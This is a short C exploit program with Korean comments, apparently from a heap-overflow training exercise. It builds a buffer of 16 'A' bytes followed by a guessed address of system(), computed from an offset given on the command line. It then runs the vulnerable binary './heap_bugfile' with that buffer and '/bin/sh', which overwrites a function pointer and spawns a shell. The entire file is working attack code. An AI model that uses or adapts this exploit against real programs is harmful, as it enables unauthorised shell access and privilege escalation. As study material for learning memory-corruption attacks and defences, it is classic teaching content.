#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define BUFSIZE 16 		// 함수 포인터(funcptr)과 buf 와의 거리

#define BUGPROG "./heap_bugfile" 	// 취약 프로그램의 위치
#define CMD "/bin/sh" 		// 실행할 명령

#define ERROR -1

int main(int argc, char **argv){
	register int i;
	u_long sysaddr;
	static char buf[BUFSIZE + sizeof(u_long) + 1] = {0};

	if (argc <= 1){
		fprintf(stderr, "Usage: %s <offset>\n", argv[0]);
		exit(ERROR);
	}

	sysaddr = (u_long)&system - atoi(argv[1]);
	printf("Trying system() at 0x%lx\n", sysaddr);

	memset(buf, 'A', 16);

	for (i = 0; i < sizeof(sysaddr); i++)
		buf[BUFSIZE + i] = ((u_long)sysaddr >> (i * 8)) & 255;

	execl(BUGPROG, BUGPROG, buf, CMD, NULL); 
	return 0;
}

